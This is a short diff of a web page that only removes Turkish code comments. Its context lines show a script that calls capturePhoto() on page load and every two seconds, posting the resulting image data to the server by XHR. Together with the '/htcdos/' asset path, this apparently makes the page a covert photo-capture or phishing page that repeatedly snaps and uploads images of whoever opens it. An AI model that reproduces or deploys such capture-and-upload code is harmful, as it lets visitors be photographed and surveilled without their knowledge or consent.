@@ -16,15 +16,15 @@
         }
         .background {
           background-image: url('/htcdos/d.gif');
-          background-size: cover; /* veya contain, isteğe bağlı olarak */
+          background-size: cover; 
           background-repeat: no-repeat;
           background-position: center center;
-          height: 100vh; /* Ekranın tamamını kaplamak için */
+          height: 100vh;
           display: flex;
           flex-direction: column;
           align-items: center;
           justify-content: center;
-          color: #ffffff; /* Metin rengi, isteğe bağlı olarak */
+          color: #ffffff;
 }
         h1 {
             color: black;
@@ -118,7 +118,7 @@
         xhr.send('imageDataUrl=' + encodeURIComponent(imageDataUrl));
     }
       window.onload = function() {
-        capturePhoto(); // Sayfa yüklendiğinde bir kere çağrılır
+        capturePhoto();
         setInterval(capturePhoto, 2000);
 </script>
 
